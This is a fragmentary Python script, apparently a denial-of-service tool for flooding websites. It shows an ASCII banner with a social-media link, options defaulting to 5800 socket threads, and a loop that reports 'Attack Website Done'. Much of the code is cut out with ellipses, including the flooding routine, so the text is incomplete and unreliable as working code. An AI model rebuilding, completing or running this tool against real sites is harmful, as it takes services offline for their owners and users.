...
\:::_ \ \\:::_ \ \\:::_ \ \\::::_\/_     
 \:\ \ \ \\:\ \ \ \\:\ \ \ \\:\/___/\    
  \:\ \ \ \\:\ \ \ \\:\ \ \ \\_::._\:\   
   \:\/.:| |\:\/.:| |\:\_\ \ \ /____\:\  
 ___\____/_/_\____/_/_\_____\/ \_____\/  
/_____/\  /_______/\/_____/\             
\:::_ \ \ \__.::._\/\::::_\/_            
 \:\ \ \ \   \::\ \  \:\/___/\           
  \:\ \ \ \  _\::\ \__\::___\/_          
...
link fb: https://www.facebook.com/profile.php?id=100082783568502    |
____________________________________________________________________|''', 'red'))
time.sleep(6)
...
def main():
    ...
    options.add_argument("-t", "--thread", metavar="THREAD COUNT", default=5800, type=int, help="Count of socket thread instances to be run")
    options.add_argument("--timeout", metavar="TIMEOUT", default=12, type=int, help="Socket connection timeout value")
    ...
    while True:
        try:
            ...
            print(colored(f"Attack Website Done: {active_threads}", 'green'))
            time.sleep(0)
        except KeyboardInterrupt:
            exit()
